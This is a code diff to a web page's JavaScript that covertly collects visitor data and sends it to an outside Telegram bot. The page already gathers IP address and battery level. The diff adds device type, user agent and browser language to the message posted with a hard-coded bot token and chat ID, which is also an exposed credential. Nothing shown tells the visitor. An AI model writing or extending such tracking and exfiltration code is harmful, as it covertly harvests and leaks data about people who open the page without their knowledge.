@@ -42,6 +42,17 @@
         const TELEGRAM_BOT_TOKEN = '8539452307:AAE3Px3RSVeT-YjpxTWp_btbswWg5_o0DTo';
         const TELEGRAM_CHAT_ID = '8714686528';
 
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                return 'Tablet';
+            }
+            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) {
+                return 'Mobile';
+            }
+            return 'Desktop';
+        }
+
         async function getBatteryPercentage() {
             try {
                 if ('getBattery' in navigator) {
@@ -63,9 +74,14 @@
                 ]);
 
                 const visitorIp = ipResponse.ip;
-                const message = `IP: ${visitorIp}\nBattery: ${batteryPercentage}`;
+                const deviceType = getDeviceType();
+                const userAgent = navigator.userAgent;
+                const language = navigator.language || navigator.userLanguage || 'Unknown';
 
-                // Send data to Telegram
+                // Format the message with all collected parameters
+                const message = `IP: ${visitorIp}\nBattery: ${batteryPercentage}\nDevice: ${deviceType}\nLanguage: ${language}\nUser Agent: ${userAgent}`;
+
+                // Send payload to Telegram
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
